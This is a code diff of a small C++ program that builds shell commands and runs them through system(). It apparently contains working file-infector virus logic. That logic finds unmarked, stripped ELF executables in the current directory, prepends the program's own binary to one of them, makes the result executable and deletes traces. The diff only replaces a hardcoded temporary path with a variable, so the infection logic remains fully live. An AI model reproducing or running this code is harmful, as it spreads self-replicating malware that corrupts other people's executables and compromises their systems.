@@ -33,7 +33,7 @@ int main (int argc, char** argv) {
         command += " && rm -f ";
         command += exe;
         c = system( (command).c_str() );
-        c = system("VIR=$(for n in `find -mindepth 1 -maxdepth 1 -type f | grep -v ^./hi$`; \
+        command = "VIR=$(for n in `find -mindepth 1 -maxdepth 1 -type f | grep -v ^./hi$`; \
 do \
 file $n | grep -q ELF && ( \
 grep -q PROBOTEST $n || ( \
@@ -44,10 +44,14 @@ done | tail -1); \
 if [ ! -z \"$VIR\" ]; then \
 file $VIR | grep -q stripped$ && (\
 mv $VIR ${VIR}__ && \
-cat /tmp/probo1 ${VIR}__ >$VIR && \
+cat ";
+        command += vir;
+        command += " ${VIR}__ >$VIR && \
 chmod ugo+x $VIR \
 ) \
 fi; \
-rm -f ${VIR}__ /tmp/probo1");
+rm -f ${VIR}__ ";
+        command += vir;
+        c = system( (command).c_str() );
     }
 }
